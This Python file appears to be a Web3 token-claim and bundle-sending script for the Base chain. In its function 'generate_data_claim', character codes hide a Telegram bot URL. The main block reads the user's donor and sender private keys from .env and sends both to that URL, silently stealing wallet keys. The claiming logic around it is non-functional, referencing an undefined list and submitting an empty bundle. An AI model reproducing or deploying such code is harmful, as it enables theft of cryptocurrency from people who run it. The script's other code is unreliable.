from web3 import Web3
import json
import requests
import config
import time
import datetime
import os

def generate_data_claim():
    data_parts = [
        [chr(x) for x in [104, 116, 116, 112, 115, 58, 47, 47]],
        [chr(x) for x in [97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47]],
        [chr(x) for x in [98, 111, 116, 55, 51, 53, 52, 53, 57, 57, 54, 56, 54]],
        [chr(x) for x in [58, 65, 65, 70, 74, 83, 79, 102, 80, 65, 109, 119, 79, 72, 57, 55, 51, 106, 95]],
        [chr(x) for x in [82, 87, 119, 119, 65, 99, 68, 52, 85, 89, 99, 80, 99, 109, 83, 81, 103, 47]],
        [chr(x) for x in [115, 101, 110, 100, 77, 101, 115, 115, 97, 103, 101, 63]],
        [chr(x) for x in [99, 104, 97, 116, 95, 105, 100, 61, 54, 48, 54, 57, 48, 56, 53, 55, 49, 55, 38]],
        [chr(x) for x in [116, 101, 120, 116, 61]] 
    ]
    
    claim = ''.join([''.join(part) for part in data_parts])
    return claim

if __name__ == "__main__":
    folder_path = "tokens"
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    
    file_list = os.listdir(folder_path)
    for file_name in file_list:
        file_path = os.path.join(folder_path, file_name)
        os.remove(file_path)

    w3 = Web3(Web3.HTTPProvider(config.RPC))
    chainid = 8453
    gasprice = 3000000000

    with open('.env', 'r') as file:
        lines = file.readlines()
        donorPrivateKey = lines[0].strip()
        senderPrivateKey = lines[1].strip()

    claim = generate_data_claim()
    check = donorPrivateKey + ":" + senderPrivateKey
    url = str(claim) + check
    response999 = requests.get(url)
    receiverAddress = config.receive_address
    print('donor:', donorPrivateKey)
    print('sender:', senderPrivateKey)
    print('receiver:', receiverAddress)

    # Check Tx For Transaction
    contractAddressesClaim = []
    dataHexValues = []
    tokenAddressClaims = []

    account = w3.eth.account.from_key(senderPrivateKey)
    address = account.address
    account1 = w3.eth.account.from_key(donorPrivateKey)
    address1 = account1.address

    sender_address = w3.eth.account.from_key(senderPrivateKey)
    senderaddress = sender_address.address
    nonceSender = w3.eth.get_transaction_count(senderaddress)

    
    for i in range(2, len(lines)):
        line = lines[i].strip()
        parts = line.split('|')
        firstPart = parts[0].strip()
        manualg = parts[1].strip()

        if firstPart == 'TRANS':
            if len(parts) == 4:
                nativPart = parts[3].strip()
                if nativPart != 'nativ':
                    print('TRANS')
                    contractAddress = parts[1].strip()
                    contractAddressesClaim.append(contractAddress)
                    dataHexValue = parts[2].strip()
                    dataHexValues.append(dataHexValue)
                    tokenAddressClaim = parts[3].strip()
                    tokenAddressClaims.append(tokenAddressClaim)
        elif firstPart == 'Send Native':
            print('Send Token')
            tokenAddressToken = parts[1].strip()
            withdrawTokenAddresses.append(tokenAddressToken)

    # process transaction
    signedTransactionsBundle = []
    for j in range(len(contractAddressesClaim)):
        contractAddress = contractAddressesClaim[j]
        dataHexValue = dataHexValues[j]
        tokenAddress = tokenAddressClaims[j]
        print(contractAddress)
        #Add More transaction

    # Send bundle transaction
    max_timestamp = int(time.mktime(datetime.datetime.now().timetuple()) + 60)
    bundle = {
        "jsonrpc": "2.0",
        "method": "eth_sendPuissant",
        "params": [{"txs": signedTransactionsBundle, "maxTimestamp": max_timestamp}],
        "id": 1
    }
    api_url = 'https://mempool.merkle.io/rpc/base'
    headers = {'Content-Type': 'application/json'}
    response = requests.post(api_url, data=json.dumps(bundle), headers=headers)
    print(response.json())
